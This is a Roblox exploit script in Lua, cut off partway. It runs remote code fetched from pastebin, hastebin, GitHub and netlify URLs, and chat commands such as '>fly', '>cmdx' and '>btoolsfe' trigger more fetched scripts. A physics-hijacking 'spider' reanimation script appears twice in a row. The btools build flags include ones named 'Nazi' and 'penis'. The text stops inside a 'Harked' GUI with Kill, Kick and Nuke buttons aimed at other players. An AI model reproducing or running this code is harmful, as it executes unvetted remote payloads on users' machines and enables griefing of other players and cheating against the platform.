loadstring(game:HttpGet(("https://pastebin.com/raw/AU9zE3aq"),true))()

----------------------------------------------------------------------
----------------------------------------------------------------------

local Player = game.Players.LocalPlayer

Player.Chatted:connect(function(cht)
    if cht:match(">fly") then
        loadstring(game:httpget(("https://pastebin.com/raw/3iVjdf1H"),true))()
    elseif cht:match(">chatlogs") then
        loadstring(game:HttpGet("https://pastebin.com/raw/mUDdJKTX", true))()
    elseif cht:match(">cmdx") then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
    elseif cht:match(">sniper") then
        loadstring(game:httpget(("https://hastebin.com/raw/oqokibuxor"),true))()
elseif cht:match(">cool") then
    loadstring(game:HttpGet('https://pastebin.com/raw/McqCN7fH'))()
elseif cht:match(">spider") then
    --Made by : UNKNOWN
setsimulationradius(math.huge, math.huge)

local mouse = game.Players.LocalPlayer:GetMouse()

game.Players.LocalPlayer.Character.Archivable = true
game.Players.LocalPlayer.Character.Animate.Disabled = true
local clonec =  game.Players.LocalPlayer.Character:Clone()
clonec.Parent = workspace
clonec.Name = "POOCLONE"
clonec.Humanoid.HipHeight = -0.5
game.Players.LocalPlayer.Character = clonec
clonec.Animate.Disabled = false

workspace.Camera.CameraSubject = clonec.Humanoid
game.Players.LocalPlayer.Character = workspace[game.Players.LocalPlayer.Name]
game.Players.LocalPlayer.Character.Animate.Disabled = true
---game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
game.Players.LocalPlayer.Character.Humanoid.Animator:Destroy()

spawn(function()


while true do
if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
clonec.Humanoid.Jump = game.Players.LocalPlayer.Character.Humanoid.Jump

local veco = workspace.Camera.CFrame:VectorToObjectSpace(game.Players.LocalPlayer.Character.Humanoid.MoveDirection)
clonec.Humanoid:Move(veco, true)

end
wait()
end

end)

for i,v in pairs(clonec:GetDescendants())do 
    
    if v:IsA("Part") then 
    v.Transparency = 1
    end 
end 


--Pavuk by diemiers#4209


local bodyvelocity = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character["HumanoidRootPart"])
bodyvelocity.MaxForce = Vector3.new(9.9999999805064e+18, 9.999999869911e+14, 9.999999869911e+14)
bodyvelocity.Velocity = Vector3.new(0, 0, 0)
game:GetService("RunService").Stepped:connect(function()
    
    game.Players.LocalPlayer.Character.Torso.CanCollide = false 
    game.Players.LocalPlayer.Character.Head.CanCollide = false 
        game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false 
       game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true  
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (clonec.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(-90),0,0)) * CFrame.new(0,-0,-1)
           game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
 game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
 
end)




local segments = Instance.new("Folder")
local part = Instance.new("Part")
local part_2 = Instance.new("Part")

segments.Name = "segments"
segments.Parent = workspace
part.Anchored = true
part.CanCollide = false
part.Transparency = 1
part.Size = Vector3.new(1, 1, 2)
part.BottomSurface = Enum.SurfaceType.Smooth
part.BrickColor = BrickColor.new("Alder")
part.TopSurface = Enum.SurfaceType.Smooth
part.Color = Color3.new(0.666667, 0.333333, 1)
part.Parent = segments
part.Name = "seg1"
part.CFrame = CFrame.new(-4.1, 2.1, -37.5)
part_2.Anchored = true
part_2.CanCollide = false
part_2.Size = Vector3.new(1, 1, 2)
part_2.BottomSurface = Enum.SurfaceType.Smooth
part_2.BrickColor = BrickColor.new("Cool yellow")
part_2.TopSurface = Enum.SurfaceType.Smooth
part_2.Color = Color3.new(0.992157, 0.917647, 0.552941)
part_2.Parent = segments
part_2.CFrame = CFrame.new(-4.1, 2.1, -37.5)
part_2.Name = "seg2"
part_2.Transparency = 1

local segments2 = Instance.new("Folder")
local part = Instance.new("Part")
local part_2 = Instance.new("Part")

segments2.Name = "segments2"
segments2.Parent = workspace
part.Anchored = true
part.CanCollide = false
part.Size = Vector3.new(1, 1, 2)
part.BottomSurface = Enum.SurfaceType.Smooth
part.BrickColor = BrickColor.new("Alder")
part.TopSurface = Enum.SurfaceType.Smooth
part.Name = "seg1"
part.Color = Color3.new(0.666667, 0.333333, 1)
part.Parent = segments2
part.CFrame = CFrame.new(-4.1, 2.1, -37.5)
part_2.Anchored = true
part_2.CanCollide = false
part_2.Size = Vector3.new(1, 1, 2)
part_2.BottomSurface = Enum.SurfaceType.Smooth
part_2.BrickColor = BrickColor.new("Alder")
part_2.TopSurface = Enum.SurfaceType.Smooth
part_2.Color = Color3.new(0.666667, 0.333333, 1)
part_2.Parent = segments2
part_2.CFrame = CFrame.new(-4.1, 2.1, -37.5)
part_2.Name = "seg2"
part_2.Transparency = 1
part.Transparency = 1



local leg1 = Instance.new("Part")
leg1.Anchored = true
leg1.Size = Vector3.new(0.5, 0.2, 0.5)
leg1.BottomSurface = Enum.SurfaceType.Smooth
leg1.Color = Color3.new(0, 1, 0)
leg1.BrickColor = BrickColor.new("New Yeller")
leg1.TopSurface = Enum.SurfaceType.Smooth
leg1.Name = "leg1"
leg1.Parent = workspace
leg1.CFrame = CFrame.new(-31.15, 0.1, 8.65)
leg1.CanCollide = false
leg1.Transparency = 1





local leg1 =workspace.leg1:Clone()
leg1.Parent = workspace

local leg2= workspace.leg1:Clone()
leg2.Parent = workspace

local lp = game.Players.LocalPlayer
local head = game.Players.LocalPlayer.Character.Head

function coffset(x,y,z)
	return (head.CFrame * CFrame.new(x,y,z)).Position
end




mouse.KeyDown:connect(function(k)
	
	if k == "z" then
		
		leg1.Position = mouse.Hit.Position
	elseif k == "x" then
		
		
		leg2.Position = mouse.Hit.Position
	end
	
end)

	

		
spawn(function()
--
while true do
	
	
if game.Players.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude >0.1 then
		wait(1.6/lp.Character.Humanoid.WalkSpeed)
		
	local ray1 =Ray.new(coffset(3,-0,0),Vector3.new(0,-10,0) )
	local hit,pos = workspace:FindPartOnRayWithIgnoreList(ray1,{leg1,leg2,lp.Character})
	if pos then
		leg1.Position = pos
		end
		

	
		wait(1.6/lp.Character.Humanoid.WalkSpeed)
	local ray2 =Ray.new(coffset(-3,-0,0),Vector3.new(0,-10,0) )
	local hit,pos = workspace:FindPartOnRayWithIgnoreList(ray2,{leg1,leg2,lp.Character})
	if pos then
	leg2.Position = pos	
		end
	
	end
	game:GetService("RunService").RenderStepped:wait()
end

end)


  

spawn(function()

local mouse = game.Players.LocalPlayer:GetMouse()



local len  = 2

local offset = Vector3.new(1,-3,0)
	
	local offset = Vector3.new(1,-1,0)
	
local segs = {}

local posn =  game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,-2.5,0)






for i,v in pairs(workspace.segments:GetChildren()) do
	
	
	
	table.insert(segs,v)
	
	
end






function vectorabsy(vec)
	local v = Vector3.new(vec.X,math.abs(vec.Y),vec.Z)
	return v
end


local count = #segs


while true do
	
	for i = 1,5 do
		
	for i = 1,count do
		
		if i == 1 then
			
			local seg = segs[i]
			
			local pos1 = 	segs[i].Position - (segs[i].CFrame.LookVector* (len/2) )  -- Calculating position that is on back of the part
			local pos2 =leg1.Position
			local vec = (pos2 - pos1).Unit 
			
			local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) 
			
			seg.CFrame = cframe
			
		else
				local seg = segs[i]
			local pos1 = 	segs[i].Position - (segs[i].CFrame.LookVector* (len/2) )
			local pos2 = 	segs[i-1].Position - (segs[i-1].CFrame.LookVector* (len/2) )
			local vec = (pos2 - pos1).Unit
				local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) 
			
			seg.CFrame = cframe
		end

	end	
	
	--Back

	
		for i = 1,count do
		
		local i = ( count - i ) + 1
		if i == count then
			
			local seg = segs[i]
			
			local pos1 = 	segs[i].Position + (segs[i].CFrame.LookVector* (len/2) )  -- Calculating position that is on back of the part
			local pos2 =(game.Players.LocalPlayer.Character.Head.CFrame * CFrame.new(offset)).Position  
			local vec =(pos2 - pos1).Unit 
			if vec.Y > 0 then
				
			vec = Vector3.new(vec.X, vec.Y-0.01 ,vec.Z)	
				
			end
			
			local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) * CFrame.Angles(0,math.rad(-180),0) 
			
			seg.CFrame =cframe
			
		else
				local seg = segs[i]
			local pos1 = 	segs[i].Position + (segs[i].CFrame.LookVector* (len/2) )
			
			local pos2 = 	segs[i+1].Position + (segs[i+1].CFrame.LookVector* (len/2) )
			local vec = (pos2 - pos1).Unit 
			
				local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2)  * CFrame.Angles(0,math.rad(-180),0)
			
			seg.CFrame = cframe
		end

		end	
		
	end
	game:GetService("RunService").Heartbeat:wait()
end
	
end)




spawn(function()

local mouse = game.Players.LocalPlayer:GetMouse()



local len  = 2

local offset = Vector3.new(-1,-1,0)

local segs = {}

local posn =  game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,-2.5,0)






for i,v in pairs(workspace.segments2:GetChildren()) do
	
	

	table.insert(segs,v)
	
	
end





function vectorabsy(vec)
	local v = Vector3.new(vec.X,math.abs(vec.Y),vec.Z)
	return v
end


local count = #segs


while true do

	for i = 1,5 do
		
	for i = 1,count do
		
		if i == 1 then
			
			local seg = segs[i]
			
			local pos1 = 	segs[i].Position - (segs[i].CFrame.LookVector* (len/2) )  -- Calculating position that is on back of the part
			local pos2 =leg2.Position
			local vec = (pos2 - pos1).Unit 
		
			local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) 
			
			seg.CFrame = cframe
			
		else
				local seg = segs[i]
			local pos1 = 	segs[i].Position - (segs[i].CFrame.LookVector* (len/2) )
			local pos2 = 	segs[i-1].Position - (segs[i-1].CFrame.LookVector* (len/2) )
			local vec = (pos2 - pos1).Unit
				local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) 
			
			seg.CFrame = cframe
		end

	end	
	
	--Back

	
		for i = 1,count do
		
		local i = ( count - i ) + 1
		if i == count then
			
			local seg = segs[i]
			
			local pos1 = 	segs[i].Position + (segs[i].CFrame.LookVector* (len/2) )  -- Calculating position that is on back of the part
			local pos2 =(game.Players.LocalPlayer.Character.Head.CFrame * CFrame.new(offset)).Position  
			local vec =(pos2 - pos1).Unit 
			if vec.Y > 0 then
				
			vec = Vector3.new(vec.X, vec.Y-0.01 ,vec.Z)	
				
			end
			
			local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) * CFrame.Angles(0,math.rad(-180),0) 
			
			seg.CFrame =cframe
			
		else
				local seg = segs[i]
			local pos1 = 	segs[i].Position + (segs[i].CFrame.LookVector* (len/2) )
			
			local pos2 = 	segs[i+1].Position + (segs[i+1].CFrame.LookVector* (len/2) )
			local vec = (pos2 - pos1).Unit 
			
				local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2)  * CFrame.Angles(0,math.rad(-180),0)
			
			seg.CFrame = cframe
		end

		end	
		
	end
	game:GetService("RunService").Heartbeat:wait()
end
	
end)


game.Players.LocalPlayer.Character.Torso["Right Shoulder"]:Destroy()
game.Players.LocalPlayer.Character.Torso["Left Shoulder"]:Destroy()
game.Players.LocalPlayer.Character.Torso["Right Hip"]:Destroy()
game.Players.LocalPlayer.Character.Torso["Left Hip"]:Destroy()


	
local bodyvelocity = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character["Right Arm"])
bodyvelocity.MaxForce = Vector3.new(9.9999999805064e+18, 9.999999869911e+14, 9.999999869911e+14)
bodyvelocity.Velocity = Vector3.new(0, 200, 0)

local bodyvelocity = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character["Left Arm"])
bodyvelocity.MaxForce = Vector3.new(9.9999999805064e+18, 9.999999869911e+14, 9.999999869911e+14)
bodyvelocity.Velocity = Vector3.new(0, 200, 0)

local bodyvelocity = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character["Left Leg"])
bodyvelocity.MaxForce = Vector3.new(9.9999999805064e+18, 9.999999869911e+14, 9.999999869911e+14)
bodyvelocity.Velocity = Vector3.new(0, 200, 0)

local bodyvelocity = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character["Right Leg"])
bodyvelocity.MaxForce = Vector3.new(9.9999999805064e+18, 9.999999869911e+14, 9.999999869911e+14)
bodyvelocity.Velocity = Vector3.new(0, 200, 0)

spawn(function()
	

	game.Players.LocalPlayer.Character.Humanoid.Died:connect(function()
		
		segments:Destroy()
		segments2:Destroy()
		
	end)
	
	game:GetService("RunService").Stepped:connect(function()
	  	game.Players.LocalPlayer.Character["Right Arm"].CanCollide = false
	game.Players.LocalPlayer.Character["Left Arm"].CanCollide = false
		
	 game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
	game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false

	   end)
	
	repeat game:GetService("RunService").Heartbeat:wait()
		
	game.Players.LocalPlayer.Character["Right Arm"].CFrame = 	segments.seg1 .CFrame * CFrame.Angles(math.rad(90),0,0 )
	game.Players.LocalPlayer.Character["Left Arm"].CFrame = 	segments.seg2.CFrame * CFrame.Angles(math.rad(90),0,0 )
		
	 game.Players.LocalPlayer.Character["Right Leg"].CFrame = 	segments2.seg1.CFrame * CFrame.Angles(math.rad(90),0,0 )
	game.Players.LocalPlayer.Character["Left Leg"].CFrame = 	segments2.seg2.CFrame * CFrame.Angles(math.rad(90),0,0 )
	
	until game.Players.LocalPlayer.Character.Humanoid.Health  < 1

		
		
		
	
	
end)--Made by : UNKNOWN
setsimulationradius(math.huge, math.huge)

local mouse = game.Players.LocalPlayer:GetMouse()

game.Players.LocalPlayer.Character.Archivable = true
game.Players.LocalPlayer.Character.Animate.Disabled = true
local clonec =  game.Players.LocalPlayer.Character:Clone()
clonec.Parent = workspace
clonec.Name = "POOCLONE"
clonec.Humanoid.HipHeight = -0.5
game.Players.LocalPlayer.Character = clonec
clonec.Animate.Disabled = false

workspace.Camera.CameraSubject = clonec.Humanoid
game.Players.LocalPlayer.Character = workspace[game.Players.LocalPlayer.Name]
game.Players.LocalPlayer.Character.Animate.Disabled = true
---game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
game.Players.LocalPlayer.Character.Humanoid.Animator:Destroy()

spawn(function()


while true do
if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
clonec.Humanoid.Jump = game.Players.LocalPlayer.Character.Humanoid.Jump

local veco = workspace.Camera.CFrame:VectorToObjectSpace(game.Players.LocalPlayer.Character.Humanoid.MoveDirection)
clonec.Humanoid:Move(veco, true)

end
wait()
end

end)

for i,v in pairs(clonec:GetDescendants())do 
    
    if v:IsA("Part") then 
    v.Transparency = 1
    end 
end 


--Pavuk by diemiers#4209


local bodyvelocity = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character["HumanoidRootPart"])
bodyvelocity.MaxForce = Vector3.new(9.9999999805064e+18, 9.999999869911e+14, 9.999999869911e+14)
bodyvelocity.Velocity = Vector3.new(0, 0, 0)
game:GetService("RunService").Stepped:connect(function()
    
    game.Players.LocalPlayer.Character.Torso.CanCollide = false 
    game.Players.LocalPlayer.Character.Head.CanCollide = false 
        game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false 
       game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true  
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (clonec.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(-90),0,0)) * CFrame.new(0,-0,-1)
           game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
 game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
 
end)




local segments = Instance.new("Folder")
local part = Instance.new("Part")
local part_2 = Instance.new("Part")

segments.Name = "segments"
segments.Parent = workspace
part.Anchored = true
part.CanCollide = false
part.Transparency = 1
part.Size = Vector3.new(1, 1, 2)
part.BottomSurface = Enum.SurfaceType.Smooth
part.BrickColor = BrickColor.new("Alder")
part.TopSurface = Enum.SurfaceType.Smooth
part.Color = Color3.new(0.666667, 0.333333, 1)
part.Parent = segments
part.Name = "seg1"
part.CFrame = CFrame.new(-4.1, 2.1, -37.5)
part_2.Anchored = true
part_2.CanCollide = false
part_2.Size = Vector3.new(1, 1, 2)
part_2.BottomSurface = Enum.SurfaceType.Smooth
part_2.BrickColor = BrickColor.new("Cool yellow")
part_2.TopSurface = Enum.SurfaceType.Smooth
part_2.Color = Color3.new(0.992157, 0.917647, 0.552941)
part_2.Parent = segments
part_2.CFrame = CFrame.new(-4.1, 2.1, -37.5)
part_2.Name = "seg2"
part_2.Transparency = 1

local segments2 = Instance.new("Folder")
local part = Instance.new("Part")
local part_2 = Instance.new("Part")

segments2.Name = "segments2"
segments2.Parent = workspace
part.Anchored = true
part.CanCollide = false
part.Size = Vector3.new(1, 1, 2)
part.BottomSurface = Enum.SurfaceType.Smooth
part.BrickColor = BrickColor.new("Alder")
part.TopSurface = Enum.SurfaceType.Smooth
part.Name = "seg1"
part.Color = Color3.new(0.666667, 0.333333, 1)
part.Parent = segments2
part.CFrame = CFrame.new(-4.1, 2.1, -37.5)
part_2.Anchored = true
part_2.CanCollide = false
part_2.Size = Vector3.new(1, 1, 2)
part_2.BottomSurface = Enum.SurfaceType.Smooth
part_2.BrickColor = BrickColor.new("Alder")
part_2.TopSurface = Enum.SurfaceType.Smooth
part_2.Color = Color3.new(0.666667, 0.333333, 1)
part_2.Parent = segments2
part_2.CFrame = CFrame.new(-4.1, 2.1, -37.5)
part_2.Name = "seg2"
part_2.Transparency = 1
part.Transparency = 1



local leg1 = Instance.new("Part")
leg1.Anchored = true
leg1.Size = Vector3.new(0.5, 0.2, 0.5)
leg1.BottomSurface = Enum.SurfaceType.Smooth
leg1.Color = Color3.new(0, 1, 0)
leg1.BrickColor = BrickColor.new("New Yeller")
leg1.TopSurface = Enum.SurfaceType.Smooth
leg1.Name = "leg1"
leg1.Parent = workspace
leg1.CFrame = CFrame.new(-31.15, 0.1, 8.65)
leg1.CanCollide = false
leg1.Transparency = 1





local leg1 =workspace.leg1:Clone()
leg1.Parent = workspace

local leg2= workspace.leg1:Clone()
leg2.Parent = workspace

local lp = game.Players.LocalPlayer
local head = game.Players.LocalPlayer.Character.Head

function coffset(x,y,z)
	return (head.CFrame * CFrame.new(x,y,z)).Position
end




mouse.KeyDown:connect(function(k)
	
	if k == "z" then
		
		leg1.Position = mouse.Hit.Position
	elseif k == "x" then
		
		
		leg2.Position = mouse.Hit.Position
	end
	
end)

	

		
spawn(function()
--
while true do
	
	
if game.Players.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude >0.1 then
		wait(1.6/lp.Character.Humanoid.WalkSpeed)
		
	local ray1 =Ray.new(coffset(3,-0,0),Vector3.new(0,-10,0) )
	local hit,pos = workspace:FindPartOnRayWithIgnoreList(ray1,{leg1,leg2,lp.Character})
	if pos then
		leg1.Position = pos
		end
		

	
		wait(1.6/lp.Character.Humanoid.WalkSpeed)
	local ray2 =Ray.new(coffset(-3,-0,0),Vector3.new(0,-10,0) )
	local hit,pos = workspace:FindPartOnRayWithIgnoreList(ray2,{leg1,leg2,lp.Character})
	if pos then
	leg2.Position = pos	
		end
	
	end
	game:GetService("RunService").RenderStepped:wait()
end

end)


  

spawn(function()

local mouse = game.Players.LocalPlayer:GetMouse()



local len  = 2

local offset = Vector3.new(1,-3,0)
	
	local offset = Vector3.new(1,-1,0)
	
local segs = {}

local posn =  game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,-2.5,0)






for i,v in pairs(workspace.segments:GetChildren()) do
	
	
	
	table.insert(segs,v)
	
	
end






function vectorabsy(vec)
	local v = Vector3.new(vec.X,math.abs(vec.Y),vec.Z)
	return v
end


local count = #segs


while true do
	
	for i = 1,5 do
		
	for i = 1,count do
		
		if i == 1 then
			
			local seg = segs[i]
			
			local pos1 = 	segs[i].Position - (segs[i].CFrame.LookVector* (len/2) )  -- Calculating position that is on back of the part
			local pos2 =leg1.Position
			local vec = (pos2 - pos1).Unit 
			
			local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) 
			
			seg.CFrame = cframe
			
		else
				local seg = segs[i]
			local pos1 = 	segs[i].Position - (segs[i].CFrame.LookVector* (len/2) )
			local pos2 = 	segs[i-1].Position - (segs[i-1].CFrame.LookVector* (len/2) )
			local vec = (pos2 - pos1).Unit
				local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) 
			
			seg.CFrame = cframe
		end

	end	
	
	--Back

	
		for i = 1,count do
		
		local i = ( count - i ) + 1
		if i == count then
			
			local seg = segs[i]
			
			local pos1 = 	segs[i].Position + (segs[i].CFrame.LookVector* (len/2) )  -- Calculating position that is on back of the part
			local pos2 =(game.Players.LocalPlayer.Character.Head.CFrame * CFrame.new(offset)).Position  
			local vec =(pos2 - pos1).Unit 
			if vec.Y > 0 then
				
			vec = Vector3.new(vec.X, vec.Y-0.01 ,vec.Z)	
				
			end
			
			local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) * CFrame.Angles(0,math.rad(-180),0) 
			
			seg.CFrame =cframe
			
		else
				local seg = segs[i]
			local pos1 = 	segs[i].Position + (segs[i].CFrame.LookVector* (len/2) )
			
			local pos2 = 	segs[i+1].Position + (segs[i+1].CFrame.LookVector* (len/2) )
			local vec = (pos2 - pos1).Unit 
			
				local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2)  * CFrame.Angles(0,math.rad(-180),0)
			
			seg.CFrame = cframe
		end

		end	
		
	end
	game:GetService("RunService").Heartbeat:wait()
end
	
end)




spawn(function()

local mouse = game.Players.LocalPlayer:GetMouse()



local len  = 2

local offset = Vector3.new(-1,-1,0)

local segs = {}

local posn =  game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,-2.5,0)






for i,v in pairs(workspace.segments2:GetChildren()) do
	
	

	table.insert(segs,v)
	
	
end





function vectorabsy(vec)
	local v = Vector3.new(vec.X,math.abs(vec.Y),vec.Z)
	return v
end


local count = #segs


while true do

	for i = 1,5 do
		
	for i = 1,count do
		
		if i == 1 then
			
			local seg = segs[i]
			
			local pos1 = 	segs[i].Position - (segs[i].CFrame.LookVector* (len/2) )  -- Calculating position that is on back of the part
			local pos2 =leg2.Position
			local vec = (pos2 - pos1).Unit 
		
			local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) 
			
			seg.CFrame = cframe
			
		else
				local seg = segs[i]
			local pos1 = 	segs[i].Position - (segs[i].CFrame.LookVector* (len/2) )
			local pos2 = 	segs[i-1].Position - (segs[i-1].CFrame.LookVector* (len/2) )
			local vec = (pos2 - pos1).Unit
				local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) 
			
			seg.CFrame = cframe
		end

	end	
	
	--Back

	
		for i = 1,count do
		
		local i = ( count - i ) + 1
		if i == count then
			
			local seg = segs[i]
			
			local pos1 = 	segs[i].Position + (segs[i].CFrame.LookVector* (len/2) )  -- Calculating position that is on back of the part
			local pos2 =(game.Players.LocalPlayer.Character.Head.CFrame * CFrame.new(offset)).Position  
			local vec =(pos2 - pos1).Unit 
			if vec.Y > 0 then
				
			vec = Vector3.new(vec.X, vec.Y-0.01 ,vec.Z)	
				
			end
			
			local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2) * CFrame.Angles(0,math.rad(-180),0) 
			
			seg.CFrame =cframe
			
		else
				local seg = segs[i]
			local pos1 = 	segs[i].Position + (segs[i].CFrame.LookVector* (len/2) )
			
			local pos2 = 	segs[i+1].Position + (segs[i+1].CFrame.LookVector* (len/2) )
			local vec = (pos2 - pos1).Unit 
			
				local cframe = CFrame.new(pos2 - (vec*(len/2) ),pos2)  * CFrame.Angles(0,math.rad(-180),0)
			
			seg.CFrame = cframe
		end

		end	
		
	end
	game:GetService("RunService").Heartbeat:wait()
end
	
end)


game.Players.LocalPlayer.Character.Torso["Right Shoulder"]:Destroy()
game.Players.LocalPlayer.Character.Torso["Left Shoulder"]:Destroy()
game.Players.LocalPlayer.Character.Torso["Right Hip"]:Destroy()
game.Players.LocalPlayer.Character.Torso["Left Hip"]:Destroy()


	
local bodyvelocity = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character["Right Arm"])
bodyvelocity.MaxForce = Vector3.new(9.9999999805064e+18, 9.999999869911e+14, 9.999999869911e+14)
bodyvelocity.Velocity = Vector3.new(0, 200, 0)

local bodyvelocity = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character["Left Arm"])
bodyvelocity.MaxForce = Vector3.new(9.9999999805064e+18, 9.999999869911e+14, 9.999999869911e+14)
bodyvelocity.Velocity = Vector3.new(0, 200, 0)

local bodyvelocity = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character["Left Leg"])
bodyvelocity.MaxForce = Vector3.new(9.9999999805064e+18, 9.999999869911e+14, 9.999999869911e+14)
bodyvelocity.Velocity = Vector3.new(0, 200, 0)

local bodyvelocity = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character["Right Leg"])
bodyvelocity.MaxForce = Vector3.new(9.9999999805064e+18, 9.999999869911e+14, 9.999999869911e+14)
bodyvelocity.Velocity = Vector3.new(0, 200, 0)

spawn(function()
	

	game.Players.LocalPlayer.Character.Humanoid.Died:connect(function()
		
		segments:Destroy()
		segments2:Destroy()
		
	end)
	
	game:GetService("RunService").Stepped:connect(function()
	  	game.Players.LocalPlayer.Character["Right Arm"].CanCollide = false
	game.Players.LocalPlayer.Character["Left Arm"].CanCollide = false
		
	 game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
	game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false

	   end)
	
	repeat game:GetService("RunService").Heartbeat:wait()
		
	game.Players.LocalPlayer.Character["Right Arm"].CFrame = 	segments.seg1 .CFrame * CFrame.Angles(math.rad(90),0,0 )
	game.Players.LocalPlayer.Character["Left Arm"].CFrame = 	segments.seg2.CFrame * CFrame.Angles(math.rad(90),0,0 )
		
	 game.Players.LocalPlayer.Character["Right Leg"].CFrame = 	segments2.seg1.CFrame * CFrame.Angles(math.rad(90),0,0 )
	game.Players.LocalPlayer.Character["Left Leg"].CFrame = 	segments2.seg2.CFrame * CFrame.Angles(math.rad(90),0,0 )
	
	until game.Players.LocalPlayer.Character.Humanoid.Health  < 1

		
		
		
	
	
end)
elseif cht:match(">btoolsfe") then
    -- no cursing!
_G.CheckCustomBuilds = true
_G.DefaulBuilds = true
_G.Barrier = true
_G.bridge2 = true
_G.bridge4 = true
_G.ladder = true
_G.Nazi = true
_G.penis = true
_G.platform = true
_G.stairs = true
_G.BigPP = true

_G.RGB = false
_G.RGBswitchDelay = .4

_G.RejoinWaitDelayForReExecute = 5  -- tell how long the script will wait before rejoining (for synapse script queing)

loadstring(game:HttpGet("https://ssbtools.netlify.app/assets/storage/LOADSTRING_SCRIPT2.txt"))()
elseif cht:match(">harked") then
    local main = Instance.new("ScreenGui")
local top = Instance.new("Frame")
local back = Instance.new("Frame")
local kill = Instance.new("TextButton")
local btools = Instance.new("TextButton")
local top_2 = Instance.new("TextLabel")
local naked = Instance.new("TextButton")
local credits = Instance.new("TextLabel")
local hatless = Instance.new("TextButton")
local sink = Instance.new("TextButton")
local nuke = Instance.new("TextButton")
local kick = Instance.new("TextButton")
local target = Instance.new("TextBox")
local queue = Instance.new("TextLabel")
local nolimbs = Instance.new("TextButton")
--Properties:
main.Name = "main"
main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

top.Name = "top"
top.Parent = main
top.Draggable = true
top.Active = true
top.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
top.BackgroundTransparency = 0.30000001192093
top.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
top.Position = UDim2.new(0.612145662, 0, 0.311965823, 0)
top.Size = UDim2.new(0, 291, 0, 30)

back.Name = "back"
back.Parent = top
back.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
back.BackgroundTransparency = 0.30000001192093
back.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
back.BorderSizePixel = 0
back.Position = UDim2.new(-0.00343642617, 0, 1, 0)
back.Size = UDim2.new(0, 293, 0, 293)

kill.Name = "kill"
kill.Parent = top
kill.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
kill.BackgroundTransparency = 0.5
kill.BorderSizePixel = 0
kill.Position = UDim2.new(0.0206185561, 0, 1.76666665, 0)
kill.Size = UDim2.new(0, 134, 0, 40)
kill.Font = Enum.Font.SourceSansLight
kill.Text = "Kill"
kill.TextColor3 = Color3.new(1, 1, 1)
kill.TextSize = 23

btools.Name = "btools"
btools.Parent = top
btools.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
btools.BackgroundTransparency = 0.5
btools.BorderSizePixel = 0
btools.Position = UDim2.new(0.525773168, 0, 1.76666665, 0)
btools.Size = UDim2.new(0, 131, 0, 40)
btools.Font = Enum.Font.SourceSansLight
btools.Text = "Btools"
btools.TextColor3 = Color3.new(1, 1, 1)
btools.TextSize = 23

top_2.Name = "top"
top_2.Parent = top
top_2.BackgroundColor3 = Color3.new(1, 1, 1)
top_2.BackgroundTransparency = 1
top_2.Position = UDim2.new(0.154639184, 0, -0.333333343, 0)
top_2.Size = UDim2.new(0, 200, 0, 50)
top_2.Font = Enum.Font.SourceSansLight
top_2.Text = "Harked"
top_2.TextColor3 = Color3.new(1, 1, 1)
top_2.TextSize = 45

naked.Name = "naked"
naked.Parent = top
naked.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
naked.BackgroundTransparency = 0.5
naked.BorderSizePixel = 0
naked.Position = UDim2.new(0.0206185561, 0, 3.56217241, 0)
